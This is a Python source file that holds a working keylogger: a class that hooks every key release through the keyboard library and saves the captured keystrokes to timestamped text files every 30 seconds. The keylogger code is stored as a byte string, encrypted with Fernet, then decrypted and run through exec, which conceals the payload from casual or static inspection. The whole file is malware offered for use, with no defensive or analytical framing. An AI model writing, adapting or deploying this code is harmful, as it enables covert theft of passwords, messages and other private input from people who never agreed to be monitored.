import keyboard
import os
from cryptography.fernet import Fernet
from datetime import datetime
from threading import Timer
Script = b""" #stores a multi-line string as bytes
import keyboard
from threading import Timer
from datetime import datetime
SEND_REPORT_EVERY = 30 #in seconds

class Keylogger:
    def __init__(self, interval, report_method="file"): #initializes with the specified reporting interval and report method ("file").
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    def callback(self, event):  #called whenever a key is pressed, and it records the keypresses in the log attribute
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    def update_filename(self): #generates a unique filename based on the start and end timestamps
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    def report_to_file(self): #saves the captured keystrokes to a local text file with a timestamped filename
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    def report(self): #method that periodically reports the captured keystrokes based on the specified interval and chosen reporting method
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = "" #Basically used for reinitialising
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    def start(self): #initializes the keylogger by setting up event handling and starting the reporting process
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
if __name__ == "__main__":
    # if you want a keylogger to record keylogs to a local file 
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    print("[+] Keylogger started")
    keylogger.start()
"""
# Used for securing the myCode script using FERNET Cryptography build on top of AES(supports key lengths of 128, 192, and 256 bits compared to 56 bits of DES)
# This key is used for both encryption and decryption, and it must be kept secret
key = Fernet.generate_key()
encryption_type = Fernet(key)  # a Fernet object is created
encrypted_message = encryption_type.encrypt(Script)

decrypted_message = encryption_type.decrypt(encrypted_message)

exec(decrypted_message)  # used to execute the content of the decrypted_message
